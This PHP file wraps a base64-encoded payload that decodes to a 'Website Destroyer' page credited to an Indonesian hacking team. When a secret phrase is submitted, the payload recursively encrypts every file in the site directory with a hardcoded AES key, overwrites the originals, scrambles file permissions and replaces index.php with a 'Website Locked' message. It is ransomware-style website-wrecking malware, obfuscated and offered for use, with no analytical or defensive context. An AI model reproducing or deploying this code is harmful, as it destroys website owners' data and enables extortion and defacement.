<?=base64_decode("PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKJGN1cnJlbnRfZmlsZSA9IGJhc2VuYW1lKF9fRklMRV9fKTsgLy8gTmFtYSBmaWxlIFBIUCBpbmkgKG1pc2FsbnlhICdwZXJ1c2FrX3NpdGUucGhwJykKJGRpcmVjdG9yeSA9IF9fRElSX187IC8vIERpcmVrdG9yaSB0ZW1wYXQgZmlsZSBpbmkgYmVyYWRhCiRlbmNyeXB0aW9uX2tleSA9ICd5b3VyLWVuY3J5cHRpb24ta2V5JzsgLy8gR2FudGkgZGVuZ2FuIGt1bmNpIGVua3JpcHNpIHlhbmcga3VhdAokc2VjcmV0X3Byb21wdCA9ICdLRUhBTkNVUkFOJzsgLy8gUHJvbXB0IHJhaGFzaWEgcGVuZ2hhbmN1cmFuIHlhbmcgYmVuYXIKCi8vIEZ1bmdzaSB1bnR1ayBtZW5nZW5rcmlwc2kga29udGVuIGZpbGUKZnVuY3Rpb24gZW5jcnlwdF9maWxlKCRmaWxlX3BhdGgsICRrZXksICRjdXJyZW50X2ZpbGUpIHsKICAgIHRyeSB7CiAgICAgICAgLy8gQWJhaWthbiBmaWxlIGluaSBhZ2FyIHRpZGFrIHRlcmVua3JpcHNpCiAgICAgICAgaWYgKGJhc2VuYW1lKCRmaWxlX3BhdGgpID09PSAkY3VycmVudF9maWxlKSB7CiAgICAgICAgICAgIHJldHVybiB0cnVlOyAvLyBMZXdhdGkgZmlsZSBpbmkKICAgICAgICB9CgogICAgICAgICRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVfcGF0aCk7CiAgICAgICAgaWYgKCRjb250ZW50ID09PSBmYWxzZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdHYWdhbCBtZW1iYWNhIGZpbGUnKTsKICAgICAgICB9CgogICAgICAgICRlbmNyeXB0ZWRfY29udGVudCA9IG9wZW5zc2xfZW5jcnlwdCgkY29udGVudCwgJ2Flcy0yNTYtY2JjJywgJGtleSwgMCwgc3Vic3RyKCRrZXksIDAsIDE2KSk7CiAgICAgICAgaWYgKCRlbmNyeXB0ZWRfY29udGVudCA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignRW5rcmlwc2kgZ2FnYWwnKTsKICAgICAgICB9CgogICAgICAgICRyZXN1bHQgPSBmaWxlX3B1dF9jb250ZW50cygkZmlsZV9wYXRoLCAkZW5jcnlwdGVkX2NvbnRlbnQpOwogICAgICAgIGlmICgkcmVzdWx0ID09PSBmYWxzZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCdHYWdhbCBtZW55aW1wYW4gZmlsZSB0ZXJlbmtyaXBzaScpOwogICAgICAgIH0KCiAgICAgICAgLy8gTWVuZ2FjYWsgZGFuIG1lbmdnYW50aSBjaG1vZCBmaWxlIHNlY2FyYSBhY2FrCiAgICAgICAgY2htb2QoJGZpbGVfcGF0aCwgcmFuZCgwLCAwNzc3KSk7CgogICAgICAgIHJldHVybiB0cnVlOyAvLyBFbmtyaXBzaSBiZXJoYXNpbAogICAgfSBjYXRjaCAoRXhjZXB0aW9uICRlKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOyAvLyBFbmtyaXBzaSBnYWdhbAogICAgfQp9CgovLyBGdW5nc2kgdW50dWsgbWVuZ2Vua3JpcHNpIGZpbGUgZGFuIGZvbGRlciBkaSBkaXJla3RvcmkgeWFuZyBzYW1hCmZ1bmN0aW9uIGVuY3J5cHRfZGlyZWN0b3J5KCRkaXIsICRrZXksICRjdXJyZW50X2ZpbGUpIHsKICAgICRmaWxlcyA9IHNjYW5kaXIoJGRpcik7CiAgICAkcmVzdWx0ID0gW107CgogICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7CiAgICAgICAgJGZ1bGxfcGF0aCA9ICRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGZpbGU7CgogICAgICAgIGlmICgkZmlsZSAhPSAnLicgJiYgJGZpbGUgIT0gJy4uJykgewogICAgICAgICAgICBpZiAoaXNfZmlsZSgkZnVsbF9wYXRoKSkgewogICAgICAgICAgICAgICAgLy8gRW5rcmlwc2kgZmlsZSB5YW5nIGFkYSBkaSBkaXJla3RvcmkgaW5pIHNhamEsIGtlY3VhbGkgZmlsZSBpbmkgKGN1cnJlbnQgZmlsZSkKICAgICAgICAgICAgICAgICRzdGF0dXMgPSBlbmNyeXB0X2ZpbGUoJGZ1bGxfcGF0aCwgJGtleSwgJGN1cnJlbnRfZmlsZSkgPyAiKGVuY3J5cHRlZCkiIDogIihlcnJvcikiOwogICAgICAgICAgICAgICAgJHJlc3VsdFtdID0gWydmaWxlJyA9PiAkZmlsZSwgJ3N0YXR1cycgPT4gJHN0YXR1c107CiAgICAgICAgICAgIH0gZWxzZWlmIChpc19kaXIoJGZ1bGxfcGF0aCkpIHsKICAgICAgICAgICAgICAgIC8vIEVua3JpcHNpIGZvbGRlciwgamlrYSBmb2xkZXIgdGVyc2VidXQgYWRhCiAgICAgICAgICAgICAgICBlbmNyeXB0X2RpcmVjdG9yeSgkZnVsbF9wYXRoLCAka2V5LCAkY3VycmVudF9maWxlKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICByZXR1cm4gJHJlc3VsdDsKfQoKLy8gUHJvc2VzICJIYW5jdXJrYW4hIiB1bnR1ayBlbmtyaXBzaSBkYW4gbWVuZ2dhbnRpIGtvbnRlbiBpbmRleC5waHAKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09ICdQT1NUJykgewogICAgJHVzZXJfcHJvbXB0ID0gJF9QT1NUWydwcm9tcHQnXTsKCiAgICAvLyBWYWxpZGFzaSBhcGFrYWggcHJvbXB0IHNlc3VhaQogICAgaWYgKHN0cnRvdXBwZXIoJHVzZXJfcHJvbXB0KSA9PSAkc2VjcmV0X3Byb21wdCkgewogICAgICAgIC8vIEVua3JpcHNpIHNlbHVydWggZmlsZSBkaSBkaXJla3RvcmkgaW5pIGRhbiB0YW1waWxrYW4gc3RhdHVzCiAgICAgICAgJGVuY3J5cHRpb25fc3RhdHVzID0gZW5jcnlwdF9kaXJlY3RvcnkoJGRpcmVjdG9yeSwgJGVuY3J5cHRpb25fa2V5LCAkY3VycmVudF9maWxlKTsKCiAgICAgICAgLy8gR2FudGkga29udGVuIGluZGV4LnBocCBkZW5nYW4gdGFtcGlsYW4gdGVya3VuY2kgKG1pc2FsbnlhIGhhbGFtYW4gaGFuY3VyKQogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCdpbmRleC5waHAnLCAnPD9waHAgZWNobyAiV2Vic2l0ZSBUZXJrdW5jaSEiOyA/PicpOwoKICAgICAgICAvLyBNZW5hbXBpbGthbiBoYXNpbCBzdGF0dXMgZW5rcmlwc2kgdW50dWsgc2V0aWFwIGZpbGUKICAgICAgICBlY2hvICc8aDI+RGFmdGFyIFN0YXR1cyBFbmtyaXBzaTo8L2gyPic7CiAgICAgICAgZWNobyAnPHVsPic7CiAgICAgICAgZm9yZWFjaCAoJGVuY3J5cHRpb25fc3RhdHVzIGFzICRmaWxlX2luZm8pIHsKICAgICAgICAgICAgJHN0YXR1c19jbGFzcyA9ICRmaWxlX2luZm9bJ3N0YXR1cyddID09PSAiKGVuY3J5cHRlZCkiID8gJ3N0eWxlPSJjb2xvcjpyZWQiJyA6ICcnOwogICAgICAgICAgICBlY2hvICI8bGkgeyRzdGF0dXNfY2xhc3N9PnskZmlsZV9pbmZvWydmaWxlJ119IHskZmlsZV9pbmZvWydzdGF0dXMnXX08L2xpPiI7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzwvdWw+JzsKCiAgICAgICAgZXhpdDsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAnUHJvbXB0IHNhbGFoISBBa3NlcyBkaXRvbGFrLic7CiAgICB9Cn0KCj8+Cgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iaWQiPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDx0aXRsZT5XZWJzaXRlIERlc3Ryb3llcjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM4QjAwMDA7IC8qIE1lcmFoIERhcmFoICovCiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgZm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQoKICAgICAgICAubG9nbyB7CiAgICAgICAgICAgIHdpZHRoOiAxNTBweDsKICAgICAgICAgICAgaGVpZ2h0OiBhdXRvOwogICAgICAgICAgICBtYXJnaW4tdG9wOiAzMHB4OwogICAgICAgIH0KCiAgICAgICAgaDEgewogICAgICAgICAgICBmb250LXNpemU6IDUwcHg7CiAgICAgICAgfQoKICAgICAgICBoMiB7CiAgICAgICAgICAgIGNvbG9yOiAjRkYwMDAwOwogICAgICAgIH0KCiAgICAgICAgLmZvb3RlciB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDMwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMThweDsKICAgICAgICB9CgogICAgICAgIC5mb290ZXIgYSB7CiAgICAgICAgICAgIGNvbG9yOiAjRkY0NTAwOwogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgfQoKICAgICAgICAuZm9vdGVyIGE6aG92ZXIgewogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9InRleHQiXSB7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTZweDsKICAgICAgICAgICAgbWFyZ2luOiAxMHB4IDA7CiAgICAgICAgICAgIHdpZHRoOiA4MCU7CiAgICAgICAgICAgIG1heC13aWR0aDogMzAwcHg7CiAgICAgICAgfQoKICAgICAgICBidXR0b24gewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRkY0NTAwOwogICAgICAgICAgICBjb2xvcjogd2hpdGU7CiAgICAgICAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAyMHB4OwogICAgICAgICAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMThweDsKICAgICAgICB9CgogICAgICAgIGJ1dHRvbjpob3ZlciB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNGRjYzNDc7CiAgICAgICAgfQogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDwhLS0gTG9nbyBUZW5na29yYWsgQmhheWEgLS0+CiAgICA8aW1nIHNyYz0iaHR0cHM6Ly9pLmliYi5jby9MaHBkMVRUL2Rvd25sb2FkLXJlbW92ZWJnLXByZXZpZXcucG5nIiBhbHQ9IlNrdWxsIExvZ28iIGNsYXNzPSJsb2dvIj4KCiAgICA8aDE+V2Vic2l0ZSBEZXN0cm95ZXI8L2gxPgoKICAgIDwhLS0gRm9ybSB1bnR1ayBpbnB1dCBwcm9tcHQgcmFoYXNpYSBwZW5naGFuY3VyYW4gLS0+CiAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iIj4KICAgICAgICA8bGFiZWwgZm9yPSJwcm9tcHQiPk1hc3Vra2FuIHByb21wdCByYWhhc2lhIHBlbmdoYW5jdXJhbjo8L2xhYmVsPjxicj4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icHJvbXB0IiBpZD0icHJvbXB0IiByZXF1aXJlZD48YnI+PGJyPgogICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5IYW5jdXJrYW4hPC9idXR0b24+CiAgICA8L2Zvcm0+CgogICAgPGRpdiBjbGFzcz0iZm9vdGVyIj4KICAgICAgICA8cD5DcmVhdGVkIGJ5IEZpZHp4cGxvaXQgLSBJbmRvaGF4c2VjIFRlYW08L3A+CiAgICAgICAgPHA+PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL0lORE9IQVhTRUMiIHRhcmdldD0iX2JsYW5rIj5WaXNpdCBvdXIgR2l0SHViPC9hPjwvcD4KICAgIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K=");?>
